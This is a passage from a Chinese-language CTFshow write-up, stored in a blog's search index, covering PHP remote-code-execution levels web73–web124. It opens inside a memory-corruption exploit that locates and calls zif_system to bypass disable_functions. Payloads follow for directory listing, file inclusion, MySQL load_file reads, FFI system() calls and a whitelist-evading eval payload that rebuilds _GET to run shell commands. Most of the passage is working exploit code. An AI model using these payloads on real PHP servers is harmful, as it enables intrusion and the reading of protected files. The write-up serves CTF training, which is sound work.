class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></code></pre><h4 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h4><p>首先查找flag位置,然后使用文件包含得到flag</p><p>Payload:</p><blockquote><p>1、c&#x3D;var_export(scandir(‘&#x2F;‘));exit(0);c&#x3D;require_once(‘&#x2F;flagc.txt’);exit(0);</p><p>2、c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob://./*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?></p><p>c&#x3D;include(‘flagc.txt’);exit(0);</p></blockquote><h4 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h4><p>scandir函数被ban了，使用DirectoryIterator类，flag在&#x2F;flagx.txt</p><p>或者使用glob协议</p><p>Payload:</p><blockquote><p>c&#x3D;var_export(glob(‘..&#x2F;..&#x2F;..’.’&#x2F;*’));exit(0);</p></blockquote><h4 id="web75-Sql-load-file"><a href="#web75-Sql-load-file" class="headerlink" title="web75(Sql load_file)"></a>web75(Sql load_file)</h4><p>可以查到flag位置：&#x2F;flag36.txt  但是include被ban了，之前的poc因为strlen被禁了获取不到system地址也没法用了</p><p>可以使用mysql的load_file函数</p><p>先查询数据库</p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=localhost;dbname=information_schema"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select database()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">## $rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$rs</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>查到了ctftraining的数据库，然后使用load_file读取flag</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h4 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h4><p>Payload同上</p><h4 id="web77-FFI-php7-4以上"><a href="#web77-FFI-php7-4以上" class="headerlink" title="web77(FFI php7.4以上)"></a>web77(FFI php7.4以上)</h4><p>FFI，php7.4以上才有</p><p>Payload:</p><blockquote><p>$ffi &#x3D; FFI::cdef(“int system(const char *command);”);&#x2F;&#x2F;创建一个system对象<br>$a&#x3D;’&#x2F;readflag &gt; 1.txt’;   &#x2F;&#x2F;没有回显，需要重定向到文件<br>$ffi-&gt;system($a);       &#x2F;&#x2F;通过$ffi去调用system函数</p></blockquote><h4 id="web118-Bash内置变量"><a href="#web118-Bash内置变量" class="headerlink" title="web118(Bash内置变量)"></a>web118(Bash内置变量)</h4><p><img src="web118_3.png" loading="lazy"></p><h4 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h4><p><img src="web119_3.png" loading="lazy"></p><h4 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h4><p><img src="web120.png" loading="lazy"></p><h4 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h4><p><img src="web121.png" loading="lazy"></p><h4 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h4><p><img src="web122.png" loading="lazy"></p><h4 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h4><p>2019CISCN初赛原题</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"> &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: 收集自网络# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*&#x2F;error_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125; </code></pre><p><strong>代码审计</strong></p><p>代码接受GET传参<code>c</code>，保存在<code>content</code>中，并对参数长度进行了限制<code>&lt;80</code>。</p><p>然后设置了一个黑名单，过滤了一些特殊字符，<code>空格</code>和<code>/</code>也给过滤了，所以<code>cat /flag</code>无门。</p><p>接下来提供了一个白名单，里面是一些数学函数，并提供了一个常用数学函数的链接，可以查到这些函数的用法。</p><p>都满足以上条件后，使用<code>eval</code>来执行传入的参数。</p><p>分析到这里，只能利用白名单中提供的函数来构造命令，用到的函数有：</p><ul><li><code>base_convert()</code>：在任意进制之间转换数字</li><li><code>dechex()</code>：将十进制转换成十六进制</li><li><code>hex2bin()</code>：将十六进制转换成ascii字符</li></ul><p><strong>思路是：先利用<code>dechex()</code>将GET传入的十进制数转换成十六进制，再利用<code>hex2bin()</code>将得到的十六进制数转换成ascii字符串。又因为白名单里没有<code>hex2bin()</code>这个函数，所以需要利用<code>base_convert()</code>来将GET传入的十进制数转换成三十六进制（因为三十六进制中含有数字字母）构造出<code>hex2bin</code>，最后将分别传入的字符串拼接即可构造成功。</strong></p><p>*Trick：十进制数<code>37907361743</code>转换成三十六进制之后正好就是<code>hex2bin</code>。</p><p>因为代码中对传入的参数<code>c</code>做了长度限制，但可以通过传入其它参数，在构造出来的语句中调用即可。</p><p>这里还涉及到一个知识点，PHP中可以将函数名保存在一个变量中，然后使用这个变量来替代函数名，例如：</p><pre class="language-none"><code class="language-none">$a &#x3D; &#39;dechex&#39;;echo $a(10);&#x2F;&#x2F; a</code></pre><p>利用以上知识点，尝试构造如下payload：</p><pre class="language-none"><code class="language-none">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</code></pre><p>构造过程如下：</p><pre class="language-none"><code class="language-none">base_convert(37907361743, 10, 36);&#x3D;&gt;hex2bindechex(1598506324);&#x3D;&gt;5f474554hex2bin(&#39;5f474554&#39;);&#x3D;&gt;_GET($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) &#x3D;&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  &#x2F;&#x2F;&#123;&#125;可以代替[]综上：$pi &#x3D; base_convert(37907361743, 10, 36);$pi &#x3D; $pi(dechex(1598506324));echo $pi;&#x2F;&#x2F; _GET，即此时的$pi就是_GET</code></pre><p>拼接形成payload：</p><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</p></blockquote><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat flag.php</p><p>?c&#x3D;($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</p><p>?c&#x3D;base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</p><p>?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi{0}($pi{1})&amp;0&#x3D;system&amp;1&#x3D;cat%20flag.php</p><p>$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})<br>&#x2F;&#x2F;要在请求头里面加一个  1:tac flag.php  见下图</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Rce </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
